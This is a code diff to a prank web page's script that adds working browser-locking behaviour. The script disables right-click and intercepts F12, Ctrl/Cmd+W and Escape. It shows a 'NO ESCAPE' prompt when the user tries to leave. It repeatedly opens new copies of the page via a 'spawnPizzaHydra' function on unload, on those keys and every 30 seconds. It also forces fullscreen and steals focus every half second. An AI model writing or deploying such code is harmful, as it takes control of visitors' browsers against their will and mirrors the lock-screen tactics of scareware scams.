@@ -19,25 +19,45 @@
     const pizza = document.getElementById("pizza");
     const music = document.getElementById("music");
 
-    // trys to block closing
-    window.onbeforeunload = function() {
-      return "You can't leave. It's pizza time.";
-    };
-
-    // Disable right-click
     window.addEventListener('contextmenu', e => e.preventDefault());
 
-    // Trys to focus
+    window.onbeforeunload = function() {
+      spawnPizzaHydra(3);
+      return "NO ESCAPE. IT'S PIZZA TIME.";
+    };
+
+    window.addEventListener("unload", () => {
+      spawnPizzaHydra(5);
+    });
+
+    window.addEventListener("keydown", function(e) {
+      if (
+        e.key === "F12" || 
+        (e.ctrlKey && e.key.toLowerCase() === "w") || 
+        e.key === "Escape" || 
+        (e.metaKey && e.key.toLowerCase() === "w")
+      ) {
+        e.preventDefault();
+        spawnPizzaHydra(2);
+      }
+    });
+
     setInterval(() => {
-      window.focus();
-    }, 500);
+      spawnPizzaHydra(1);
+    }, 30000); // every 30 seconds
+
+    function spawnPizzaHydra(count) {
+      for (let i = 0; i < count; i++) {
+        window.open(window.location.href, "_blank");
+      }
+    }
 
     startBtn.onclick = function() {
       popup.style.display = "none";
       pizza.style.display = "block";
       music.play();
 
-      // trys to fullscreen
+      // Attempt fullscreen
       if (pizza.requestFullscreen) {
         pizza.requestFullscreen();
       } else if (pizza.webkitRequestFullscreen) {
@@ -47,6 +67,11 @@
       } else if (pizza.msRequestFullscreen) {
         pizza.msRequestFullscreen();
       }
+
+
+      setInterval(() => {
+        window.focus();
+      }, 500);
     };
   </script>
 
